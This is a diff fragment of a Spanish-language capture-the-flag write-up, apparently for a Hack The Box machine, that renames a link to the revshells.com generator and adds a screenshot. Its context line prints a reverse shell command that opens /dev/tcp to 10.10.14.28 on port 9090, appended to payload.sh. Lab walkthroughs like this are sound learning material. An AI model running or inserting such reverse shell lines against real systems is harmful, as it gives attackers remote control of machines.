@@ -150,9 +150,11 @@ echo "sh -i > & /dev/tcp/10.10.14.28/9090 0>&1" | tee -a payload.sh
 
 Este comando lo podemos obetener de la siguiente página
 
-[url](https://www.revshells.com/)
+[Enlace de la página](https://www.revshells.com/)
 
 Donde especificamos la ip, el puerto y el tipo que en este caso es sh
+
+![image](https://github.com/ElSantiagoBernal/HACK-THE-BOX/assets/100774275/835e2f2e-5f05-4070-822a-647ec62e7ea8)
 
 También le otorgamos permisos de ejecución al archivo
 
